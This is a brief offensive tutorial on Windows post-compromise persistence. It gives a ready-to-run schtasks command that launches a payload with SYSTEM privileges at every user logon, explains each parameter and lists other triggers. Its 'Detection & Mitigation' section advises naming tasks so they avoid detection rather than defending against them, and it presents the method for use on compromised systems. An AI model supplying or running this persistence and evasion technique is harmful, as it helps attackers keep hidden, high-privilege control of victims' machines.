Robust Persistence: Scheduled Tasks

Creating tasks for timed or event-driven payload execution with high privileges.

# Example: Creating a scheduled task to run a payload on logon with SYSTEM privileges
# Create a task named "MyPersistentTask" to run payload.exe on any user logon
schtasks /create /tn "MyPersistentTask" /tr "C:\Path\To\My\Payload.exe" /sc ONLOGON /ru SYSTEM /f

# Explanation of parameters:
# /tn "MyPersistentTask": Specifies the name of the task.
# /tr "C:\Path\To\My\Payload.exe": Defines the program to run.
# /sc ONLOGON: Sets the schedule type to run on user logon.
# /ru SYSTEM: Configures the task to run with SYSTEM privileges.
# /f: Forces the creation, overwriting if a task with the same name exists.

# Other useful schedule types:
# /sc HOURLY: Runs every hour.
# /sc DAILY: Runs daily.
# /sc ONSTART: Runs on system startup.

Key Features

  • Highly configurable: run at specific times, on events (logon, startup).
  • Can execute with high privileges (e.g., SYSTEM).
  • Integrates into legitimate Windows scheduling framework.
  • More robust and stealthy than simpler methods.

Detection & Mitigation

While robust, scheduled tasks are visible via schtasks /query or Task Scheduler GUI. Careful naming and configuration are vital to avoid detection.

Key Takeaway

Windows Scheduled Tasks provide a powerful and flexible way to achieve persistent, high-privilege execution on compromised systems.
